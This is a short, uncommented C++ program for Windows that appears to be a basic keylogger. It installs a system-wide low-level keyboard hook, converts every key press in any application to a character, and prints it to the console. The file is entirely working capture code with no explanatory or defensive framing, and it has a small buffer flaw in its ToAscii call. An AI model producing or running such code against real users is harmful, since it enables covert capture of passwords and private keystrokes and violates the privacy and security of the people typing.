#include <Windows.h>
#include <iostream>

LRESULT CALLBACK LowLevelKeyboardProc(const int code, const WPARAM wParam, const LPARAM lParam) 
{
	if (wParam == WM_KEYDOWN) 
	{
		KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
		DWORD wVirtKey = kbdStruct->vkCode;
		DWORD wScanCode = kbdStruct->scanCode;
		BYTE KBSTATE[256];

		if (GetAsyncKeyState(VK_RETURN) & 1) 
		{
			std::cout << "" << std::endl;
		}

		if (GetKeyboardState(KBSTATE)) 
		{
			char key;
			ToAscii(wVirtKey, wScanCode, KBSTATE, (LPWORD)&key, 0);
			std::cout << key;
		}
	}
	
	return CallNextHookEx(0, code, wParam, lParam);
}


int main() 
{
	HHOOK hHook;
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
	
	if (hHook == NULL) 
	{
		int lastErrorCode = GetLastError();
		std::cout << "[-] Keyboard hook failed!\n Errorcode: " << lastErrorCode << std::endl;
		system("PAUSE");
		return 1;
	}
	
	while (GetMessage(0, 0, 0, 0));
	UnhookWindowsHookEx(hHook);
	return 0;
}







